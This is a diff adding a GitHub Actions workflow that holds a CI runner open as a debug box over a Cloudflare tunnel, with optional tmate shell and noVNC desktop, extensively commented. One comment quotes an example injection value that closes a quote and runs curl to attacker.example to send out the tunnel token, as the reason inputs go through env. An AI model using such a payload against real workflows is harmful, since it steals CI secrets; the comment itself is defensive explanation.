@@ -1,0 +1,291 @@
+name: Breakpoint
+run-name: "Breakpoint: ${{ inputs.tunnel-mode }} / ${{ inputs.duration }}m${{ inputs.run-note && format(' - {0}', inputs.run-note) || '' }}"
+
+# An on-demand debug box: a runner held open for a chosen duration, reachable
+# over a Cloudflare tunnel, optionally with a tmate shell and a noVNC desktop.
+#
+# THIS FILE IS PART OF THE FROZEN SET IN MANIFEST.sha256 AND MUST BE IDENTICAL
+# IN EVERY REPOSITORY THAT VENDORS BREAKPOINT. All per-repo variation lives in
+# .ci/breakpoint/breakpoint.conf and in repo vars/secrets, never here. That is
+# what lets the drift gate hash it -- and hashing it closes a real hole, because
+# every workflow gate in this repo (check-workflows.sh, check-workflow-gates.sh,
+# check-actions.ts) scans .github/ ONLY, so a template parked under .ci/ is
+# invisible to all three and could carry an unpinned action SHA unnoticed.
+# check-breakpoint-drift.sh therefore also `cmp`s this file against the live
+# copy at .github/workflows/breakpoint.yml.
+#
+# WORKFLOW_DISPATCH ONLY, DELIBERATELY. Two independent reasons:
+#   - ci.yml has no workflow_dispatch ("manual triggers don't satisfy PR checks
+#     and waste CI budget"), so the manual entry point has to live here.
+#   - A dispatch run has its OWN run id. The CI watchdog is dispatched with
+#     --run-id $GITHUB_RUN_ID of the CI run and monitors exactly that one id, so
+#     a session started here is structurally out of reach of its force-cancel --
+#     which matters enormously, because force-cancel bypasses `if: always()` and
+#     would otherwise skip teardown entirely.
+#
+# There is deliberately NO workflow_call. Having zero reusable-workflow surface
+# satisfies check-workflow-gates.sh CHECK 2 vacuously rather than carefully.
+
+on:
+  workflow_dispatch:
+    inputs:
+      tunnel-mode:
+        description: 'quick = random trycloudflare URL, no credentials. named = <label>-<run-id>.<zone> behind Cloudflare Access.'
+        type: choice
+        default: 'quick'
+        options: ['quick', 'named']
+
+      tunnel-label:
+        description: 'Hostname prefix (named mode). A CLOSED SET: the sweeper only reaps names it can match.'
+        type: choice
+        default: 'rdc-ci'
+        options: ['rdc-ci', 'rdc-dev', 'rdc-demo']
+
+      runner:
+        description: 'Runner. ubuntu-latest is linux amd64 and the known-good default. The *-core labels are PAID larger runners; if the org has none the job QUEUES rather than failing.'
+        type: choice
+        default: 'ubuntu-latest'
+        options:
+          - 'ubuntu-latest'
+          - 'ubuntu-24.04'
+          - 'ubuntu-22.04'
+          - 'ubuntu-24.04-arm'
+          - 'ubuntu-latest-4-core'
+          - 'ubuntu-latest-8-core'
+          - 'ubuntu-latest-16-core'
+          - 'ubuntu-latest-32-core'
+          - 'ubuntu-latest-4-core-arm'
+          - 'ubuntu-latest-8-core-arm'
+          - 'ubuntu-latest-16-core-arm'
+
+      duration:
+        description: 'Minutes to hold the box open.'
+        type: choice
+        default: '30'
+        options: ['5', '10', '15', '30', '45', '60', '90', '120', '180', '240', '300']
+
+      services:
+        description: 'none = tunnel + static origin only. core = ci-start.sh. full = core plus account/elite stacks.'
+        type: choice
+        default: 'core'
+        options: ['none', 'core', 'full']
+
+      desktop:
+        description: 'Browser desktop over noVNC. xfce only: three environments meant three untested start paths.'
+        type: choice
+        default: 'none'
+        options: ['none', 'xfce']
+
+      desktop-resolution:
+        description: 'Xvfb geometry for the desktop.'
+        type: choice
+        default: '1600x900'
+        options: ['1280x720', '1366x768', '1600x900', '1920x1080', '2560x1440']
+
+      debug-shell:
+        description: 'Start a tmate SSH/web shell. NOTE tmate web is hosted on tmate.io, OUTSIDE your tunnel, so Access does not front it.'
+        type: boolean
+        default: false
+
+      allow-fallback:
+        description: 'If named mode cannot be configured, fall back to quick. OFF by default: quick is unauthenticated, and silently dropping auth is worse than failing to start.'
+        type: boolean
+        default: false
+
+      send-email:
+        description: 'Email the access details. ON by default: on a public repo the URL is a bearer credential and the log is world-readable. Turning this off PRINTS the URL instead.'
+        type: boolean
+        default: true
+
+      access-emails:
+        description: 'Comma-separated emails allowed through Cloudflare Access (named mode). Empty resolves to the dispatching actor.'
+        type: string
+        default: ''
+
+      hold-on-failure:
+        description: 'If boot fails, still hold the box open so it can be debugged, instead of tearing down immediately.'
+        type: boolean
+        default: false
+
+      run-note:
+        description: 'Free text appended to the run name, to tell concurrent sessions apart.'
+        type: string
+        default: ''
+
+permissions:
+  contents: read
+
+# Keyed on run_id, so the group is unique per run and can NEVER collide.
+# cancel-in-progress is therefore false rather than true: the old
+# standalone-run.yml had `cancel-in-progress: true` on an identically unique
+# group, which was a no-op that READ as a policy. False states the real
+# behaviour: two operators may hold two boxes, and a new dispatch never kills a
+# live debugging session.
+concurrency:
+  group: breakpoint-${{ github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  # ==========================================================================
+  # PREFLIGHT
+  # Validates the input combination and warns about a runner label that will
+  # queue forever. Deliberately touches NO Cloudflare API: a main job that
+  # queues indefinitely must leak nothing, so nothing is created until the main
+  # job actually starts.
+  # ==========================================================================
+  preflight:
+    name: Preflight
+    runs-on: ubuntu-slim
+    timeout-minutes: 5 # CHECK 3: slim jobs must declare <= 14
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          sparse-checkout: .ci/breakpoint
+
+      - name: Validate inputs and warn on unavailable runners
+        env:
+          BP_RUNNER: ${{ inputs.runner }}
+          BP_MODE: ${{ inputs.tunnel-mode }}
+          BP_LABEL: ${{ inputs.tunnel-label }}
+          BP_DURATION: ${{ inputs.duration }}
+          BP_ACTOR: ${{ github.actor }}
+          GITHUB_RUN_ID: ${{ github.run_id }}
+        run: .ci/breakpoint/scripts/preflight-breakpoint.sh
+
+  # ==========================================================================
+  # SESSION
+  # ==========================================================================
+  session:
+    name: Session (${{ inputs.tunnel-mode }})
+    needs: [preflight]
+    runs-on: ${{ inputs.runner }}
+    # STATIC 350, and it has to be: GitHub Actions expressions have NO
+    # ARITHMETIC OPERATORS. `${{ fromJSON(inputs.duration) + 40 }}` is not a
+    # value that evaluates oddly, it is a SYNTAX ERROR -- the whole workflow
+    # fails to parse, and GitHub reports it as a run with zero jobs and
+    # "This run likely failed because of a workflow file issue", listing the
+    # workflow by file path because it never read the `name:` field.
+    #
+    # 350 rather than 360: 360 is exactly GitHub's hosted-job cap, so declaring
+    # it makes the platform kill race the declared timeout, and a platform kill
+    # reports as cancelled-with-no-failed-step -- neither pass nor fail. The
+    # deleted standalone-run.yml declared exactly 360.
+    #
+    # Being static costs little: the job ends when hold-breakpoint.sh returns
+    # after `duration` minutes, so a 5-minute session still finishes in ~5. This
+    # is only the backstop for a WEDGED session, which now holds a runner up to
+    # 350 minutes instead of duration+40. Acceptable for a manually-dispatched
+    # debug tool, and it errs toward never colliding with the platform cap.
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+
+      - name: Resolve tunnel mode
+        id: mode
+        env:
+          BREAKPOINT_TUNNEL_TOKEN: ${{ secrets.BREAKPOINT_TUNNEL_TOKEN }}
+          CLOUDFLARE_ACCOUNT_ID: ${{ vars.CLOUDFLARE_ACCOUNT_ID }}
+          BREAKPOINT_DEBUG_SHELL: ${{ inputs.debug-shell }}
+          BREAKPOINT_DESKTOP: ${{ inputs.desktop }}
+          BP_ALLOW_FALLBACK: ${{ inputs.allow-fallback }}
+          BP_TUNNEL_MODE: ${{ inputs.tunnel-mode }}
+        run: |
+          FLAGS=""
+          [ "$BP_ALLOW_FALLBACK" = "true" ] && FLAGS="--allow-fallback"
+          MODE=$(.ci/breakpoint/scripts/select-mode.sh --mode "$BP_TUNNEL_MODE" $FLAGS)
+          echo "mode=$MODE" >> "$GITHUB_OUTPUT"
+
+      - name: Install desktop packages
+        if: inputs.desktop != 'none'
+        run: .ci/breakpoint/scripts/install-vnc-desktop.sh --extras vscode,chromium
+
+      - name: Start origin
+        id: origin
+        env:
+          DESKTOP_RESOLUTION: ${{ inputs.desktop-resolution }}
+          BP_SERVICES: ${{ inputs.services }}
+          BP_DESKTOP: ${{ inputs.desktop }}
+        run: |
+          URL=$(.ci/breakpoint/scripts/start-origin.sh --port 8080 \
+            --services "$BP_SERVICES" --desktop "$BP_DESKTOP")
+          echo "url=$URL" >> "$GITHUB_OUTPUT"
+
+      - name: Start debug shell
+        id: shell
+        if: inputs.debug-shell
+        run: .ci/breakpoint/scripts/start-shell.sh --timeout 90
+
+      # EVERY interpolated value is routed through `env:` and referenced as
+      # "$VAR". This is not style. `${{ ... }}` is substituted into the script
+      # TEXT before bash parses it, so a free-text value can close the quote and
+      # run as a sibling command -- and this step's environment holds
+      # BREAKPOINT_TUNNEL_TOKEN. `access-emails` is a `type: string` input, i.e.
+      # arbitrary operator-supplied text, so
+      #     foo"; curl attacker.example/$BREAKPOINT_TUNNEL_TOKEN; echo "
+      # would have exfiltrated the Cloudflare token. Through `env:` the value is
+      # data to bash, never program text. Caught by review of f8478874.
+      - name: Start tunnel
+        id: tunnel
+        env:
+          BREAKPOINT_TUNNEL_TOKEN: ${{ secrets.BREAKPOINT_TUNNEL_TOKEN }}
+          CLOUDFLARE_ACCOUNT_ID: ${{ vars.CLOUDFLARE_ACCOUNT_ID }}
+          GITHUB_RUN_ID: ${{ github.run_id }}
+          GITHUB_ACTOR: ${{ github.actor }}
+          BP_MODE: ${{ steps.mode.outputs.mode }}
+          BP_ORIGIN: ${{ steps.origin.outputs.url }}
+          BP_LABEL: ${{ inputs.tunnel-label }}
+          BP_ACCESS_EMAILS: ${{ inputs.access-emails }}
+        run: |
+          URL=$(.ci/breakpoint/scripts/start-tunnel.sh --mode "$BP_MODE" \
+            --origin "$BP_ORIGIN" --label "$BP_LABEL" \
+            --run-id "$GITHUB_RUN_ID" --access-emails "$BP_ACCESS_EMAILS")
+          echo "url=$URL" >> "$GITHUB_OUTPUT"
+
+      # Decides email-vs-logs BEFORE masking anything, and masks only when the
+      # URL is genuinely going somewhere else. See publish-endpoints.sh: the old
+      # workflow masked unconditionally and, when SES was absent, left the
+      # operator with nothing readable at all.
+      - name: Publish access details
+        env:
+          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_SES_ACCESS_KEY_ID_EU }}
+          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SES_SECRET_ACCESS_KEY_EU }}
+          AWS_DEFAULT_REGION: ${{ vars.AWS_SES_REGION_EU }}
+          SES_FROM: ${{ vars.AWS_SES_FROM }}
+          GITHUB_ACTOR: ${{ github.actor }}
+          # Same rule as the tunnel step, and here the values are EXTERNAL:
+          # the tmate strings come from tmate.io and the URL ultimately from
+          # cloudflared's log output, while this step's environment holds the
+          # AWS SES keys. Never interpolate third-party text into script text.
+          BP_URL: ${{ steps.tunnel.outputs.url }}
+          BP_SEND_EMAIL: ${{ inputs.send-email }}
+          BP_DURATION: ${{ inputs.duration }}
+          BP_TMATE_SSH: ${{ steps.shell.outputs.ssh-connection }}
+          BP_TMATE_WEB: ${{ steps.shell.outputs.web-url }}
+        run: |
+          .ci/breakpoint/scripts/publish-endpoints.sh --url "$BP_URL" \
+            --send-email "$BP_SEND_EMAIL" --duration "$BP_DURATION" \
+            --tmate-ssh "$BP_TMATE_SSH" \
+            --tmate-web "$BP_TMATE_WEB"
+
+      - name: Hold session open
+        if: ${{ !cancelled() && (success() || inputs.hold-on-failure) }}
+        env:
+          BP_DURATION: ${{ inputs.duration }}
+          BP_ORIGIN: ${{ steps.origin.outputs.url }}
+        run: |
+          .ci/breakpoint/scripts/hold-breakpoint.sh --duration-min "$BP_DURATION" \
+            --origin "$BP_ORIGIN"
+
+      # ONE script call, not a chain of steps: after a cancellation GitHub gives
+      # the remaining always() steps only a short grace before SIGKILL, and a
+      # single sub-20s call fits inside it where a chain would not.
+      - name: Teardown
+        if: always()
+        env:
+          BREAKPOINT_TUNNEL_TOKEN: ${{ secrets.BREAKPOINT_TUNNEL_TOKEN }}
+          CLOUDFLARE_ACCOUNT_ID: ${{ vars.CLOUDFLARE_ACCOUNT_ID }}
+          BP_LABEL: ${{ inputs.tunnel-label }}
+          GITHUB_RUN_ID: ${{ github.run_id }}
+        run: |
+          .ci/breakpoint/scripts/stop-breakpoint.sh --label "$BP_LABEL" \
+            --run-id "$GITHUB_RUN_ID"
